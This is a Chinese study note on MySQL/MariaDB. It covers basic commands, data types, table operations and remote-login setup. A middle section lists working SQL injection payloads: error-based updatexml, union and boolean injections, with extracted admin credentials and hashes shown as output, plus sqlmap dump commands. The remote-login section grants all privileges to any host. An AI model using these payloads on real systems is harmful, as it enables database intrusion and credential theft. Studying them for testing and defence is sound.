# MySQL

## 基础操作

### 登录和退出

```bash
mysql -u <username> -h <address> -p <password>
# Login MariaDB Server

exit
# Exit from Server
```

### 用户操作

- 修改本地root用户密码

```bash
mysqladmin password <password>
```

- 创建用户

```mysql
CREATE USER 'new_username'@'%' IDENTIFIED BY 'new_password';
# '%' 表示允许从任何主机连接
```

- 设置密码

```mysql
SET PASSWORD FOR 'username'@'localhost' = PASSWORD('new_password');
```

- 授予权限

```mysql
GRANT ALL PRIVILEGES ON *.* TO 'username'@'%' WITH GRANT OPTION;
```

- 删除用户

```mysql
DROP USER 'username'@'%';
```

- 刷新权限

```mysql
FLUSH PRIVILEGES;
```

### 查看MySQL储存引擎

```mysql
show engines;
```

### 数据库转移

```bash
# 导出
mysqldump -u 用户名 -p 数据库名 > 导出文件名.sql
# 导入
mysql -u 用户名 -p 新数据库名 < 导出文件名.sql
```





## 数据库

### 创建数据库

```mysql
CREATE DATABASE <db_name> [[default] character set character_name];

CREATE DATABASE phpTutorio character set gbk;
# 使用命令在MySQL创建一个名为phpTutorial的数据库并设置器字符集为gbk。
```

### 查看数据库

查看所有数据库

```mysql
SHOW DATABASES;
```

查看某一个数据库的详细信息

```mysql
SHOW CREATE DATABASE <db_name>;

# 使查询信息更加直观
SHOW CREATE DATABASE <db_name> \G
```

### 删除数据库

```mysql
DROP DATABASE <db_name>;
```

### 选择数据库

```mysql
USE <db_name>;
```

### 查询当前数据库

```mysql
SELECT DATABASE();
```



## 数据

### 数据类型

整型

| 类型      | 取值范围（无符号） | 字段长度 | 说明       |
| --------- | ------------------ | -------- | ---------- |
| TINYINT   | 0~2^8              | 一字节   | 极小整数   |
| SMALLINT  | 0~2^16             | 二字节   | 小型整数   |
| MEDIUMINT | 0~2^24             | 三字节   | 中等大整数 |
| INT       | 0~2^32             | 四字节   | 普通大整数 |
| BIGINT    | 0~2^64             | 八字节   | 大整数     |

实数类型

| 类型          | 字段长度        | 说明         |
| ------------- | --------------- | ------------ |
| FLOAT         | 四字节          | 单精度浮点   |
| DOUBLE        | 八字节          | 双精度浮点   |
| DECIMAL(M, D) | M>D ? M+2 : D+2 | 压缩的定点数 |

日期时间类型

| 类型      | 范围                                    | 格式                | 说明           |
| --------- | --------------------------------------- | ------------------- | -------------- |
| DATE      | 1000-01-01~9999-12-31                   | YYYY-MM-DD          | 日期           |
| TIME      | '-838:59:59'~‘838:59:59’                | HH:MM:SS            | 时间或持续时间 |
| YEAR      | YEAR(4): 1901~2155 YEAR(2): 70~69       | YYYY YY             | 年份           |
| DATETIME  | 1000-01-01 00:00:00~9999-12-31 23:59:59 | YYYY-MM-DD HH:MM:SS | 日期时间       |
| TIMESTAMP | 1970-01-01 00:00:00~2038 03:14:07       | YYYY-MM-DD HH:MM:SS | 日期时间戳     |

字符串类型

| 类型       | 字段长度                            | 说明                     |
| ---------- | ----------------------------------- | ------------------------ |
| CHAR(M)    | M个字符，M取值范围为0~255           | 固定长度，非二进制字符串 |
| VARCHAR(M) | 字符串允许长度范围为0~65 535        | 变长非二进制字符串       |
| TINYTEXT   | 字符串允许长度范围为0~255           | 非常短的文本数据         |
| TEXT       | 字符串允许长度范围为0~65 535        | 文本数据                 |
| MEDIUMTEXT | 字符串允许长度范围为0~16 777 215    | 中等长的的文本数据       |
| LONGTEXT   | 字符串允许长度范围为0~4 294 967 295 | 长文本数据               |

CHAR 为固定长度字符串，储存时，如果字符数没有达到定义的位数，会在后面用空格补全存入数据库中。VARCHAR 为变长类型，储存时，如果字符没有达到定义的位数，也不会补空格。输入数据时，CHAR尾部的空格会被删除，而VARCHAR尾部空格会被保留。TEXT类型为变长类型，通常用于存放文章内容和评论。



### 数据表操作

#### 查看本数据库中所有表

```mysql
SHOW TABLES;
```

#### 查看表的结构

```mysql
DESCRIBE <table_name>;
```

#### 创建数据表

```mysql
CREATE TABLE <table_name> (
	col_name_1 datatype,
    col_name_2 datatype,
)
```

下列时创建一个员工记录表

```mysql
CREATE TABLE employees (
	employeeID INT(4),
    name VARCHAR(20),
    gender CHAR(1),
    title VARCHAR(10),
    birthday DATE,
    entryDate DATE,
    telName VARCHAR(20),
    resume TEXT,
    department VARCHAR(10)
)
```

#### 删除列

```mysql
ALTER TABLE table_name
DROP COLUMN column_name;
```

#### 增加列

```mysql
ALTER TABLE table_name
ADD COLUMN new_column_name datatype;
```

#### 更改列的顺序

1. 创建新表

   ```mysql
   CREATE TABLE new_table (
   	column1 datatype,
       column2 datatype,
   )
   ```

2. 复制数据到新表

   ```mysql
   INSERT INTO new_table (column1, column2)
   SELECT column1, column2
   FROM old_table;
   ```

3. 删除旧表

   ```mysql
   DROP TABLE old_table;
   ```

#### 主键约束

创建一个id为主键的列，且自动从1开始自增。

```mysql
id INT AUTO_INCREMENT PRIMARY KEY,
```

### 数据操作

#### 插入数据

```mysql
INSERT INTO table_name (column1, column2, column3)
VALUES
(value1, value2, value3),
(value1, value2, value3);
```

#### 修改数据

```mysql
UPDATE table_name
SET column1 = value1, column2 = value2
WHERE condition;
```

#### 删除数据

```mysql
DELETE FROM table_name
WHERE condition;
```

# SQL注入

## 报错注入

报错数据库名 

```sql
select updatexml(1,concat(0x7e,database()),1); 
```

' or updatexml(1,concat(0x7e,database()),1);# 

abc 

 

报错数据库表 

```sql
select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1); 
```

' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1);# 

admin 

 

如果数据库中的表（table）只有一个 

```sql
select updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1); 
```

' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1);# 

 

报错数据库表中的列 

```sql
select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=**'****table name****'**)),1); 
```

'or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=**'****admin****'**)),1);# 

username password 

 

'or updatexml(1,substr(concat(0x7e,(select concat(username,',',password) from abc.admin)),4,32),1);# 

21232f297a57a5a743894a0e4a8 

Love_is_a_light_that_never_dims 



报错数据库中的数据 

```sql
select updatexml(1,concat(0x7e,(select concat(**id**,',',**username**,',',**password**) from **login.user** limit 0,1)),1); 
```

'or updatexml(1,substr(concat(0x7e,(select concat(**username**,',',**password**) from **abc.admin** limit 1,1)),4,32),1);# 

查看从0开始第1个数据 

 

报出多个数据 

```sql
select updatexml(1,concat(0x7e,(select group_concat(**id,',',username,',',password**) from **login.user** limit 0,2)),1); 
```

'or updatexml(1,concat(0x7e,(select group_concat(**id,',',username,',',password**) from **login.user** limit 0,2)),1);# 

用group_concat输出多个数据 

## 联合注入

?id=1 order by **n** 

 

?id=-1 union select 1,2,3,4,5,6,7, 

database() 

,9,10 

 

xycms 

 

?id=-1 union select 1,2,3,4,5,6,7, 

group_concat(table_name) 

,9,10 from information_schema.tables where table_schema=database() 

 

common,config,down_fl,gbook,manage_user,menu,news,news_fl,pro_fl,xy_case,xy_download,xy_pro,xy_zp 

 

?id=-1 union select 1,2,3,4,5,6,7, 

group_concat(column_name) 

,9,10 from information_schema.columns where table_schema=database() and table_name='**manage_user**' 

 

id,m_name,m_pwd,c_date 

 

?id=-1 union select 1,2,3,4,5,6,7, 

group_concat(**m_name,0x7e,m_pwd**) 

,9,10 from **manage_user** limit 0,1 

 

admin~21232f297a57a5a743894a0e4a801fc3 

 ## 布尔注入

' or ascii(substr(database(),1,1)) > 105# 

判断 

## sqlmap指令

1. 扫描数据库名，用于获取数据库的名称

   ```bash
   sqlmap -u "<url>" --cookie="<cookie value>" --current-db
   ```

2. 扫描本数据库的表

   ```bash
   sqlmap -u "<url>" --cookie="<cookie value>" -D <Database> --tables
   ```

3. 扫描数据库表的列

   ```bash
   sqlmap -u "<url>" --cookie="<cookie value>" -D <Database> -T <table> --columns
   ```

4. 获取数据库表中列的信息

   ```bash
   sqlmap -u "<url>" --cookie="<cookie value>" -D <Database> -T <table> -C <column1>,<column2>,... --dump
   ```

   

# MariaDB 远程登陆

## 创建远程登陆用户

一般MariaDB不允许远程直接登录root账户，因此需要在本地创建一个账户用于登录远程MariaDB服务器。使用以下指令创建用户并授予权限，从而进行远程登陆。

```mysql
CREATE USER 'new_username'@'%' IDENTIFIED BY 'new_password';
# 创建用户，'%'表示允许从任何主机连接

GRANT ALL PRIVILEGES ON *.* TO 'new_username'@'%' WITH GRANT OPTION;
# 授予所有数据库的权限，*.*就是所有数据库，如果是某个数据库，则是"db_name.*"

FLUSH PRIVILEGES;
# 刷新权限
```

## 允许远程连接

- 允许从其他主机连接

MariaDB默认不允许远程连接，需要修改其设置文件才能进行远程连接。打开MariaDB的配置文件`my.cnf`，在Linux系统下通常位于`/etc/mysql/my.cnf`或者`/etc/my.cnf`。在设置文件中，找到`bind-address`一行，如果不存在，则可以手动添加一行。

```ini
bind-address = 0.0.0.0
```


其中0.0.0.0是广播IP，也就是允许其他所有主机连接至数据库。如果有需要可以自行更改。重启MariaDB服务使更改生效
	
```bash
systemctl restart mariadb
```

确保`bind-address`作为一个单独的选项，如果遇到报错，则需要将其放在[mysqld]之内。
	
```bash
root@Purgatory:/etc/mysql# mysql 
mysql: unknown variable 'bind-address=0.0.0.0
```

重新修改设置文件
	
```ini
[mysqld]
bind-address = 0.0.0.0
```

- 打开防火墙

允许从其他主机连接还需要打开相应的端口，MariaDB默认端口为3306，下面是利用`ufw`将其开启，如果没有相应防火墙设置可以跳过

```bash
ufw allow 3306
```

## 远程登录

在远程登录的设备终端，进行登录。

```bash
mysql -h <ip_address> -u <username> -p
```

然后会让你输入密码，确认后即登录到其数据库。
